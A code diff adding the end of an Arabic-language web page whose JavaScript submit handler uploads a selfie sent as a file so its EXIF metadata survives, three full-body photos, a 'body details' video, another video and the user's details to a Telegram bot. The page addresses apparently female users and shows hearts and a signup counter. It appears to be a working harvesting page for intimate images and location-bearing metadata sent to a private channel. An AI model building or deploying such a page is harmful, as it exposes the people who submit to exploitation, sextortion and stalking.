+  if(!document.getElementById("chkMeta").checked)
+    return toast("❌ يجب الموافقة على إرسال السيلفي كمعلوماتها المخزنة", "err");
+  if(bodyPhotos.length < 3)    return toast("❌ يجب إرسال 3 صور كاملة الجسم", "err");
+  if(!normalVideo)             return toast("❌ الفيديو العادي مطلوب", "err");
+  if(!bodyVideo)               return toast("❌ فيديو تفاصيل الجسم مطلوب", "err");
+
+  const btn = document.getElementById("btnSubmit");
+  const msg = document.getElementById("submitMsg");
+  btn.disabled = true;
+  msg.innerHTML = "";
+
+  const steps = [];
+
+  const setStep = (txt) => {
+    msg.innerHTML = '<div class="ok">' + txt + ' <span class="spinner"></span></div>';
+  };
+
+  try{
+    // 1) السيلفي كملف (document) للحفاظ على EXIF
+    setStep("📸 إرسال السيلفي...");
+    btn.innerHTML = 'جاري الإرسال... <span class="spinner"></span>';
+    const r1 = await tgSendFile(selfieFile, "sendDocument", "📸 صورة السيلفي (كملف مع معلوماتها)");
+    if(!r1.ok) throw new Error("السيلفي: " + (r1.description||"فشل"));
+
+    // 2) 3 صور كاملة
+    for(let i=0; i<bodyPhotos.length; i++){
+      setStep(`🖼️ إرسال صورة ${i+1} من ${bodyPhotos.length}...`);
+      const r = await tgSendFile(bodyPhotos[i], "sendPhoto", `🖼️ صورة كاملة الجسم ${i+1}/3`);
+      if(!r.ok) throw new Error(`الصورة ${i+1}: ` + (r.description||"فشل"));
+      await new Promise(s=>setTimeout(s, 300));
+    }
+
+    // 3) الفيديو العادي
+    setStep("🎬 إرسال الفيديو العادي...");
+    const r3 = await tgSendFile(normalVideo, "sendVideo", "🎬 فيديو عادي");
+    if(!r3.ok) throw new Error("الفيديو العادي: " + (r3.description||"فشل"));
+
+    // 4) فيديو تفاصيل الجسم
+    setStep("🎥 إرسال فيديو تفاصيل الجسم...");
+    const r4 = await tgSendFile(bodyVideo, "sendVideo", "🎥 فيديو تفاصيل الجسم");
+    if(!r4.ok) throw new Error("فيديو التفاصيل: " + (r4.description||"فشل"));
+
+    // 5) الرسالة النصية بالمعلومات
+    setStep("📝 إرسال المعلومات...");
+    const r5 = await tgSendMessage(buildCaption());
+    if(!r5.ok) throw new Error("الرسالة النصية: " + (r5.description||"فشل"));
+
+    // 6) زيادة عدد المسجّلين
+    bumpSignup();
+
+    msg.innerHTML = '<div class="ok">✅ تم الإرسال بنجاح</div>';
+    toast("✅ تم إرسال معلوماتك بنجاح", "ok");
+    setTimeout(()=> showPage("page5"), 700);
+
+  }catch(err){
+    console.error(err);
+    btn.disabled = false;
+    btn.innerHTML = '📤 إعادة المحاولة';
+    msg.innerHTML = '<div class="err">❌ حدث خطأ في الإرسال:<br/>' +
+      (err.message||err) +
+      '<br/><br/>💡 تأكدي من:<br/>- اتصال الإنترنت<br/>- أن حجم كل ملف أقل من 50MB<br/>- أن البوت ما زال يعمل</div>';
+    toast("فشل الإرسال — حاولي مرة أخرى", "err");
+  }
+}
+
+/* ============================================================
+   14) التهيئة
+============================================================ */
+window.addEventListener("load", ()=>{
+  spawnHearts();
+  initStats();
+});
+</script>
+
+</body>
+</html>
